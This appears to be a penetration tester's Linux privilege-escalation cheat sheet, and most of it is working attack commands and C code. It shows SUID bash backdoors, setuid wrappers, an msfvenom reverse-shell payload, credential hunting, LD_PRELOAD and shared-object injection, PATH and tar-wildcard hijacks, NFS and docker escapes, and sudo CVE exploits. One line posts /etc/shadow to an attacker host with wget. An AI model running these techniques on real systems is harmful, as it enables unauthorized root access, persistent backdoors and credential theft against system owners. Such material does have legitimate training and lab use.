## [../](../)

# Spawning root shell

## Rootbash

In this method we create a copy of bash binary with root privileges and set SUID bit on, resulting in bash executable which when executed always run with a context of root user.

```text
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
```

After creating a copy, we can run it in unprivileged terminal.

```text
/tmp/rootbash -p
```

## Executable

We create a simple C program which sets UID to 0 and runs `/bin/bash` . When compiled with root privileges, we can run it afterwards for permanent root backdoor.

```text
int main(){
    setuid(0);
    system("/bin/bash");
}
```

Compile it with root privileges.

```text
gcc -o <out_file> <source_code>
```

## Msfvenom executable

Create msfvenom reverse shell, then execute as a root with handler prepared on your attack machine.

```text
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf > shell
```

## Native reverse shells

This method needs more research.

```text
https://github.com/mthbernardes/rsg
```
# Manual enumeration

## System enumeration

```text
hostname

# enumerate os version
uname -a
cat /etc/issue
cat /proc/version
cat /etc/*-release

# enumerate number of cores
lscpu

# enumerate running services
ps aux

# enumerate installed packages
dpkg -l
```

## User enumeration

```text
# whoami
whoami
id

# what can I run as an admin
sudo -l

# enumerate users
cat /etc/passwd
cat /etc/passwd | cut -d : -f 1
cat /etc/passwd | grep "sh$"

# enumerate groups
cat /etc/group
```

## Network enumeration

```text
# enumerate network interfaces
ip a
ifconfig

# enumerate routing table
ip route
routel

#enumerate arp table
ip neigh
arp -a

# enumerate open ports and connected clients
netstat -ano
netstat -anp
ss -anp
cat /etc/iptables
```

## Hunting for interesting files

```text
# enumerate by file contents
grep --color=auto -rnw '/' -ie "password" --color=always >/dev/null
grep --color=auto -rnw '/' -ie "pass" --color=always >/dev/null
grep --color=auto -rnw '/' -ie "pwd" --color=always >/dev/null

# enumerate by file name
locate password | more
locate pass | more
locate pwd | more

# search for ssh keys
find / -name id_rsa 2>/dev/null
```

# Automated tools

### [https://github.com/rebootuser/LinEnum \(linenum.sh\)](https://github.com/rebootuser/LinEnum)

### [https://github.com/diego-treitos/linux-smart-enumeration \(lse.sh\)](https://github.com/diego-treitos/linux-smart-enumeration)

### [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite \(linpeas.sh\)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

[https://github.com/Anon-Exploiter/SUID3NUM \(suid3num.py\)](https://github.com/Anon-Exploiter/SUID3NUM)

[https://github.com/zet-/linux-exploit-suggester \(les.sh\)](https://github.com/mzet-/linux-exploit-suggester)

[https://github.com/sleventyeleven/linuxprivchecker \(linuxprivchecker.py\)](https://github.com/sleventyeleven/linuxprivchecker)

[https://github.com/AlessandroZ/BeRoot \(beroot.py\)](https://github.com/AlessandroZ/BeRoot)

[http://pentestmonkey.net/tools/audit/unix-privesc-check \(unix-privesc-check\)](http://pentestmonkey.net/tools/audit/unix-privesc-check)

## First 6 scripts can be downloaded by using this bash script

```bash
#!/bin/bash
wget "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" -O linenum.sh
chmod 700 linenum.sh
wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
chmod 700 lse.sh
wget "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" -O linpeas.sh
chmod 700 linpeas.sh
wget "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py" -O suid3num.py
chmod 700 suid3num.py
wget "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" -O les.sh
chmod 700 les.sh
wget "https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py" -O linuxprivchecker.py
chmod 700 linuxprivchecker.py
ifconfig
echo "sudo python3 -m http.server 80"
```

# Techniques

## Kernel exploits

Enumerate the kernel version:

```text
uname -a 
cat /etc/issue
```

Then use searchsploit / linux-exploit-suggester / google to find matching exploits:

```text
searchsploit linux kernel <version> priv esc

# or you can use https://github.com/jondonas/linux-exploit-suggester-2
./linux-exploit-suggester-2.pl -k <version>
```

## Service exploits

Firstly enumerate processes running as root.

```text
ps aux | grep "^root"
netstat -nl
```

Then enumerate their versions.

```text
<service> -v
<service> --version
dpkg -l | grep <service>
rpm -qa | grep <service>
```

Search for exploits for enumerated software versions.

## Stored secrets / weak file permissions

Always search through history files.

```text
history
cat ~/.bash_history
cat ~/*_history
```

Also search for files containing "password", "pass", "pwd".

```text
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

Don't overlook possible interesting files and directories with bad permissions.

```text
# Find all writable files in /etc: 
find /etc -maxdepth 1 -writable -type f

# Find all readable files in /etc: 
find /etc -maxdepth 1 -readable -type f

# Find all directories which can be written to:
find / -executable -writable -type d 2> /dev/null
```

### /etc/shadow \(default: -rw-r--r--\)

Things you can do:

1. If a file is readable, you can try to crack root hash.
2. If a file is writable, you can replace original hash.

You can generate new sha-512 \("$6$"\) hash of a password with this command.

```text
mkpasswd -m sha-512 <newpassword>
```

### /etc/passwd \(default: -rw-------\)

Things you can do when the file is writable:

1. Deleting `x` , can disable password on older systems.
2. Replacing `x` with a new password hash generated by `openssl passwd "<newpassword>"` .
3. Append new user with UID 0, but different username.

### SSH keys \(id\_rsa / authorized\_keys\)

```text
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
```

### Backups

Look for interesting files, also backups can be found in these locations.

```text
ls -la /
ls -la /tmp
ls -la /var/backups
```

## Sudo misconfigurations

Sudo is used to run programs as an another user, by default it's root.

```text
sudo -u <user> <program>
```

You can list programs which can be run without requiring password.

```text
sudo -l
```

Some ways to escalate privileges with unrestricted sudo:

```text
sudo -s
sudo -i
sudo /bin/bash
sudo passwd
```

Shell escape sequences can be found here: [https://gtfobins.github.io/](https://gtfobins.github.io/)

### "Intended functionality"

Some program's intended functionality can also help you to escalate privileges. Always google for possible privilege escalations using programs you have access to.

#### apache2 example

When you run apache as a root, you can provide configuration file with a `-f` flag. When a file is not in correct format, apache2 will print first line of a file in error message. We can use this to read first line of a `/etc/shadow` file \(root's hash\) and crack it.

```text
sudo apache2 -f /etc/shadow
```

#### wget example

Wget command can not only download files, but also post files to webserver.

You can setup netcat listener on your machine and then by running this command on target machine, will send `/etc/shadow` your way.

```text
sudo wget --post-file=/etc/shadow <LHOST>:<LPORT>
```

### LD\_PRELOAD

When LD\_PRELOAD enviroment variable is set and you run the executable, ld will first run specified library and only after that will execute original program. 

Firstly we create source code file for a shared object.

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void _init(){
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("cp /bin/bash /tmp/yz && chmod +s /tmp/yz && /tmp/yz -p");
}
```

Then compile this C code as a shared object.

```text
gcc -fPIC -shared -o shell.so shell.c -nostartfile
```

Preload this shared object when you run executable you have permission to run with sudo.

```text
sudo LD_PRELOAD=<path_to_your_so_file> <executable_you_can_run_with_sudo>
```

### CVE-2019-14287

If your user has disabled access to some executable.

```text
user ALL=(ALL,!root) /bin/bash
```

With ALL specified, user can run the binary `/bin/bash` as any user \(not only root user, other user id's works too\).

```text
sudo -u#-1 /bin/bash
```

### CVE-2019-18634

When `pwfeedback` is set in a specific versions of sudo \(&lt;1.8.25p\), we can trigger stack-based buffer overflow. Exploiting the bug does not require sudo permissions, merely that `pwfeedback` be enabled.

```text
Matching Defaults entries for user on linux-build:
insults, pwfeedback, mail_badpass, mailerpath=/usr/sbin/sendmail

User user may run the following commands on linux-build:
(ALL : ALL) ALL
```

The bug can be reproduced by passing a large input to sudo via a pipe when it prompts for a password.

```text
wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c -O exploit.c
gcc -o exploit exploit.c
./exploit
```

## SUID / SGID files

You can list SUID executable with this command.

```text
find / -perm -4000 -type f -exec ls --color=auto -l {} \;2>/dev/null
```

Check for easy wins: [https://gtfobins.github.io/](https://gtfobins.github.io/)

This script is great: [https://github.com/Anon-Exploiter/SUID3NUM](https://github.com/Anon-Exploiter/SUID3NUM)

```text
wget https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py
```

```text
# Running strace against a command:
strace -v -f -e execve <command> 2>&1 | grep exec

# Running ltrace against a command:
ltrace <command>
```

### Shared object injection

Sometimes executables use third party shared objects, which we are able to hijack and run our malicious code, with permissions of original executable.

You can run `strings` on SUID executables, then look for shared object paths.

Also `strace` can show objects used by the executable.

```text
strace <executable> 2>&1
strace <executable> 2>&1 | grep -i -E "open|access|no such file"
```

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/yz && chmod +s /tmp/yz && /tmp/yz -p");
}
```

Compile shared object with gcc.

```text
gcc -shared -fPIC -o <output> shared_object.c
```

### Binary simlinks

[https://packetstormsecurity.com/files/139750/Nginx-Root-Privilege-Escalation.html](https://packetstormsecurity.com/files/139750/Nginx-Root-Privilege-Escalation.html)

### Enviromental variables \(PATH\)

Find anything related to enviromental variables\(PATH, etc...\)

```text
strings <executable>
```

When you find executable called without full path, create your own with same name.

```c
void main(){
    setgid(0);
    setuid(0);
    system("cp /bin/bash /tmp/yz && chmod +s /tmp/yz && /tmp/yz -p");
}
```

Then compile it.

```text
gcc executable.c -o executable
```

And change path to your working directory.

```text
export PATH=/tmp:$PATH
```

### Malicious bash functions

Find out if executable runs any bash commands.

```text
strings <executable>
```

When you find one, create a bash function.

```text
function /command/you/found() {cp /bin/bash /tmp/yz && chmod +s /tmp/yz && /tmp/yz -p}
export -f /command/you/found
```

Again run original executable. But now it will run your bash function instead of original command.

## Capabilities

Kernel 2.2 and higher.

```text
getcap -r / 2>/dev/null
```

You are looking for `+ep` , like this.

```text
/usr/bin/python2.6 = cap_setuid+ep
```

And then: [https://gtfobins.github.io/\#+capabilities](https://gtfobins.github.io/#+capabilities)

```text
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

## Cron jobs

Crons can be enumerated with:

```text
cat /etc/crontab
```

Also located in these directories.

```text
/var/spool/cron/
/var/spool/cron/crontabs/
```

The crontab PATH environment variable is by default set to `/usr/bin:/bin`

### Cron paths

PATH + relative path = win

### Wildcards \(\*\)

When.

```text
cd /home/user
tar czf /tmp/backup.tar.gz *
```

Then you can. 

```text
echo "cp /bin/bash /tmp/yz && chmod +s /tmp/yz" > malicious.sh
chmod +x malicious.sh
touch ./--checkpoint=1
touch ./--checkpoint-action=exec=sh\malicious.sh
```

## NFS root squashing

Check for `no_root_squash` .

```text
cat /etc/exports
```

Then you can list mountable folders from your attacker machine.

```text
showmount -e <RHOST>
```

And mount one of them.

```text
mkdir /tmp/<local_folder>
mount -o rw,vers=2 <RHOST>:/<remote_folder> /tmp/<local_folder>
```

Create a .c file inside your newly mounted folder.

```c
void main(){
    setgid(0);
    setuid(0);
    system("cp /bin/bash /tmp/yz && chmod +s /tmp/yz && /tmp/yz -p");
}
```

Compile it and set SUID bit on.

```text
gcc malicious.c -o malicious
chmod +s malicious
```

Finally, run it from target machine.

## Docker

If you are member of a `docker` group, you can easily escalate to root.

```text
docker run -v /:/tmp -i -t bash bash
```



# Privilege escalation

## Situational awareness

```text
id
cat /etc/passwd
hostname
cat /etc/issue
cat /etc/*-release
uname -a
ps aux
ip a
ifconfig
route
routel
netstat -anp
ss -anp
cat /etc/iptables
la -lah /etc/cron*
dpkg -l

# page 528 for more
```

## Spawning root shell

### Rootbash

```text
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
/tmp/rootbash -p
```

### Executable

Create bash wrapper in c

```text
int main(){
    setuid(0);
    system("/bin/bash");
}
```

Then, compile it as a root

```text
gcc -o <out_file> <source_code>
```

### Msfvenom executable

Create msfvenom payload, then execute as a root.

```text
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf > shell
```

### Native reverse shells

```text
https://github.com/mthbernardes/rsg
```

## Enumeration tools

```text
https://github.com/diego-treitos/linux-smart-enumeration
https://github.com/rebootuser/LinEnum
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
https://github.com/sleventyeleven/linuxprivchecker
https://github.com/AlessandroZ/BeRoot
http://pentestmonkey.net/tools/audit/unix-privesc-check
```

## Techniques

### Kernel exploits

Enumerate the kernel version:

```text
uname -a 
cat /etc/issue
```

Use searchsploit to find matching exploits:

```text
searchsploit linux kernel <version> priv esc

# or you can use https://github.com/jondonas/linux-exploit-suggester-2
./linux-exploit-suggester-2.pl -k <version>
```

### Service exploits

Show processes running as root:

```text
ps aux | grep "^root"
netstat -nl
```

Enumerate program versions:

```text
<service> -v
<service> --version
dpkg -l | grep <service>
rpm -qa | grep <service>
```

Search for exploits

### Weak file permissions

```text
# Find all writable files in /etc: 
find /etc -maxdepth 1 -writable -type f

# Find all readable files in /etc: 
find /etc -maxdepth 1 -readable -type f

# Find all directories which can be written to:
find / -executable -writable -type d 2> /dev/null
```

#### /etc/shadow

1. Crack root hash.
2. Replace original hash with new:

```text
mkpasswd -m sha-512 <newpassword>
```

#### /etc/passwd

1. Delete `x` , works on older systems.
2. Replace `x` with new password hash generated by `openssl passwd "<newpassword>"` .
3. Append new user with UID 0, but different username.

### Backups

Look for interesting files:

```text
ls -la /
ls -la /tmp
ls -la /var/backups
```

### Sudo

```text
# Run a program using sudo:
sudo <program>

# Run a program as a specific user: 
sudo -u <user> <program>

# List programs a user is allowed (and disallowed) to run:
sudo -l
```

Other ways to escalate privileges with sudo:

```text
sudo -s
sudo -i
sudo /bin/bash
sudo passwd
```

Shell escape sequences for more programs can be found here:

```text
https://gtfobins.github.io/
```

### Cron jobs

Located in:

```text
/var/spool/cron/
/var/spool/cron/crontabs/
/etc/crantab
```

The crontab PATH environment variable is by default set to `/usr/bin:/bin`

### SUID / SGID files

```text
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;2> /dev/null
find / -user <user> -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

```text
https://github.com/Anon-Exploiter/SUID3NUM
```

```text
# Running strings against a file:
strings <file>

# Running strace against a command:
strace -v -f -e execve <command> 2>&1 | grep exec

# Running ltrace against a command:
ltrace <command>
```

## Privesc strategy

Spend some time and read over the results of your enumeration.

If Linux Smart Enumeration level 0 or 1 finds something interesting, make a note of it. Create a checklist of things you need for the privilege escalation method to work.

Have a quick look around for files in your user’s home directory and other common locations \(e.g. /var/backup, /var/logs\). If your user has a history file, read it, it may have important information like commands or even passwords.

Try things that don’t have many steps first, e.g. Sudo, Cron Jobs, SUID files.

Have a good look at root processes, enumerate their versions and search for exploits.

Check for internal ports that you might be able to forward to your attacking machine.

If you still don’t have root, re-read your full enumeration dumps and highlight anything that seems odd. This might be a process or file name you aren’t familiar with, an “unusual” filesystem configured \(on Linux, anything that isn’t ext, swap, or tmpfs\), or even a username.

At this stage you can also start to think about Kernel Exploits.

